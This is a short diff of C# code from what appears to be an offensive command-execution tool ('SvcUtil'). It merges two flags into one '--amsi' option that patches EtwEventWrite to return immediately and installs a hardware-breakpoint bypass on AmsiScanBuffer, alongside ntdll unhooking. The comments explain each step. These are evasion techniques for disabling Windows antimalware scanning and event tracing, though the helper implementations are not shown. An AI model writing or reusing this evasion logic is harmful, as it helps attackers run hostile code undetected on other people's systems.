@@ -24,8 +24,7 @@ namespace SvcUtil
         /// is executed as a separate short-lived process.
         /// </summary>
         public static bool Execute(string commandLine, IShellStream stream,
-                                    bool patchScan = false,
-                                    bool hwBpScan = false,
+                                    bool amsi = false,
                                     bool unhookNtdll = false)
         {
             // Ntdll unhooking — restore clean .text from disk
@@ -33,13 +32,12 @@ namespace SvcUtil
             if (unhookNtdll)
                 NtdllUnhook.Run();
 
-            // AMSI bypass for in-process operations
-            if (patchScan)
-                Ctx.Run();
-            else if (hwBpScan)
+            // --amsi: ETW patch + HW breakpoint AMSI bypass
+            // HW breakpoint = no code modification on amsi.dll
+            if (amsi)
             {
-                Ctx.A1(); // ETW patch — needed even after unhook
-                AmsiHwBp.Install();
+                Ctx.A1();           // Patch EtwEventWrite → ret
+                AmsiHwBp.Install(); // VEH + DR0 on AmsiScanBuffer
             }
 
             bool usePwsh = Ctx.Chk(commandLine);
